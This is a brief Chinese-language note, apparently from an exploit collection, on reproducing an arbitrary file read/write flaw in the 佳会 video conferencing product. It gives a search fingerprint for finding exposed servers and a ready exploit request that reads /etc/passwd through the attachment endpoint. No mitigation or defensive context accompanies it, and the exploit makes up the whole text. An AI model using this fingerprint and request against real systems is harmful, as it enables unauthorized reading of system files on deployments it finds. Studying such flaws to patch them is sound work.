# 佳会视频会议attachment任意文件读取漏洞复现

佳会视频会议attachment ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/system/get_rtc_user_defined_info?site_id"`
- **请求**：`GET /attachment?file=/etc/passwd HTTP/1.1`